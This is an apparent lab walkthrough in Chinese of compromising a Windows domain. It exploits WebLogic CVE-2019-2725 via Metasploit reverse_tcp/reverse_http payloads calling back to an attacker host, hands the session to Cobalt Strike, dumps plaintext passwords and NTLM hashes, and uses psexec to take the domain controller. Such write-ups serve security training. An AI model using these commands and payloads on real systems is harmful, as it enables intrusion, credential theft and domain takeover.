# getshell
## 信息收集
**端口服务扫描**

```bash
nmap -sV  192.168.242.73	#防火墙拦截icmp,需要跳过存活扫描
nmap -sV -Pn 192.168.242.73
```

结果

```bash
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 7.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2008 R2 10.50.4000; SP2
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
7001/tcp  open  http          Oracle WebLogic Server (Servlet 2.5; JSP 2.1)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785830888315-ea66d847-d27e-4627-86f9-078a3b88cb0e.png)

检测到weblogic

## 漏洞扫描
扫描weblogic漏洞

```bash
python WeblogicScan.py 192.168.242.73 7001
```

结果

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785832737180-032b74cb-d0bb-4bf8-8924-91afcbe70492.png)

```bash
CVE-2019-2725 AsyncResponseService 反序列化
CVE-2017-3506 反序列化 次选
CVE-2018-2893 反序列化 备选

SSRF UDDI 模块 /uddiexplorer/ 暴露，可进一步利用
控制台暴露 /console/login/LoginForm.jsp，可尝试弱口令爆破（5 组常见密码已失败）
```

## 漏洞利用
### **<font style="color:rgb(23, 24, 26);">CVE-2019-2725利用</font>**
用msf

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785847132747-7aa57d87-3171-40fb-b105-5d3767454992.png)

设置参数

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785847598346-57126f0f-453c-4cf2-b7f4-1c4ecb23d578.png)

run没有拿到会话

默认payload是32位,靶机windows2008是64位,换payload

```bash
set target Windows
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.188.127
run
```

还是拿不到会话

换http传输

```bash
set target Windows
set payload windows/meterpreter/reverse_http
set lhost 192.168.188.127
run
```

拿到会话

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785848871792-5f2a6e0d-e446-4dc7-9735-3e30a84270f4.png)

# 内网渗透(cs打法)
## MSF->CS会话派生
**启动cs服务端**

```plain
root@kali:~# cd cobalt_strike_4.7

root@kali:~/cobalt_strike_4.7# chmod +x teamserver cobaltstrike start.sh		//授予权限
                                                                                                                  
root@kali:~/cobalt_strike_4.7# systemctl stop ufw		//关闭防火墙
                                                                                                                                           
root@kali:~/cobalt_strike_4.7# ./teamserver 192.168.188.127 kali
```

**启动cs客户端**

```plain
┌──(root㉿kali)-[~]
└─# cd cobalt_strike_4.7
                                                                                                                                       
┌──(root㉿kali)-[~/cobalt_strike_4.7]
└─# ./cobaltstrike
```

点击connect

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785851152029-11c506f1-2a23-4c3d-9d99-c70bd69bc7f0.png)

**cs创建监听器**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785851297625-f0677081-9483-44f7-99f0-f098b9c152af.png)

**msf派生**

回到msf会话

```plain
background    #将会话放在后台
```

```plain
use windows/local/payload_inject
set SESSION 1                       # 你的 session 号
set PAYLOAD windows/meterpreter/reverse_http
set LHOST 192.168.188.127
set LPORT 8082                     # 与 CS 监听端口一致
run
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785851850753-5fbbaef0-9fd1-457e-bca7-6d687f4d7fe3.png)

回到cs中看到上线

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785893626698-8bebf382-149b-43c1-a7c9-928f4bcbfeb4.png)

## 信息收集
```plain
shell ipconfig/all
logonpasswords
```

+ **域名**: de1ay.com
+ **域控主机名**: DC
+ **域控IP**: 10.10.10.10
+ **域SID**: S-1-5-21-2756371121-2868759905-3853650604
+ **Administrator**: 2wsx!QAZ / NTLM: cf83cd7efde13e0ce754874aaa979a74（域管）
+ **de1ay**: 1qaz@WSX / NTLM: 161cff084477fe596a5db81874498a24（域用户）
+ **mssql**: 1qaz@WSX / NTLM: 161cff084477fe596a5db81874498a24（服务账户）
+ **WEB**: 外网192.168.242.13 / 内网10.10.10.80（已控）
+ **DC**: 内网10.10.10.10（待横向）
+ **PC**: 外网192.168.242.218（待横向）

验证域IP是否正确

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785896684264-4b14d5dd-da7c-43e1-bdb4-94a673448af7.png)

## 横向移动(->dc)
已经拿到域控管理员明文账号密码,使用明文密码->smb协议->psexec

1. Listeners → Add → Payload `Beacon SMB` → Save
2. 右键 WEB 的 Beacon → Jump → `psexec64`
3. 弹窗里填：
    - Target: `10.10.10.10`(dc机的内网ip)
    - Listener: 选刚创建的 SMB
    - Session: 选刚创建的 SMB
    - User: `de1ay.com\Administrator`
    - Password: `2wsx!QAZ`
4. Launch
5. WEB Beacon 掉一会，等恢复就行，DC 自己弹回来。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785899661124-02e1d7ca-320f-42ba-8a26-bcc68919e04f.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785899744170-48e117f0-10f4-4508-bad8-b5196b4850e3.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785899956510-262835c8-d321-467e-a7ce-2da1d15e2b9c.png)

获得域控主机

## 横向移动(->pc->dc)
